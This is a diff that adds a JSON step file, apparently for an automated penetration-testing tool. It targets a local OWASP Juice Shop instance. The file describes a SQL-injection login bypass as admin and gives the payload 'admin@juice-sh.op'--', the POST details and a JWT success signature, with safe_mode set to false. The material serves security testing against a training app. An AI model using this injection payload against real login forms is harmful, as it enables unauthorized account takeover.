@@ -1,0 +1,18 @@
+{
+  "steps": [
+    {
+      "weakness_id": "w_juice_sqli_login",
+      "target_url": "http://localhost:3001/rest/user/login",
+      "objective": "Authenticate as admin@juice-sh.op without knowing the password by injecting a SQL comment sequence into the email field, completing the login query early. Success = HTTP 200 response containing a JWT bearer token.",
+      "severity": "critical",
+      "hints": {
+        "technique": "SQL injection via authentication query bypass",
+        "payload_hint": "email=admin@juice-sh.op'-- with arbitrary password",
+        "expected_response_signature": "JSON response with .authentication.token (JWT)",
+        "request_method": "POST",
+        "content_type": "application/json"
+      },
+      "safe_mode": false
+    }
+  ]
+}
